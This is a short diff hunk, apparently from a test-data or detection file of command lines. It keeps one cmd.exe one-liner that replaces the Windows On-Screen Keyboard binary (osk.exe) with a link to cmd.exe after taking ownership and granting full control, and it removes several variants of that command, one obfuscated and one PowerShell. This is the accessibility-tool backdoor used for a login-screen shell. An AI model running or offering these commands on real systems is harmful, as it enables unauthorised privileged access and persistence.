@@ -1,6 +1,1 @@
 "cmd.exe" /c IF NOT EXIST %%windir%%\System32\osk.exe.bak (copy %%windir%%\System32\osk.exe %%windir%%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %%windir%%\System32\osk.exe /A & icacls %%windir%%\System32\osk.exe /grant Administrators:F /t & del %%windir%%\System32\osk.exe & mklink %%windir%%\System32\osk.exe %%windir%%\System32\cmd.exe
-cmd  /c "mklink C:\Windows\System32\osk.exe C:\Windows\System32\cmd.exe"
-cmd.exe /c "set a=mk; set b=link; %a%%b% osk.exe cmd.exe"
-copy cmd.exe osk.exe /y
-mklink "osk.exe" "..\..\Windows\System32\cmd.exe"
-powershell -Command "New-Item -ItemType SymbolinkLink -Path 'osk.exe' -Target 'cmd.exe' -Force"
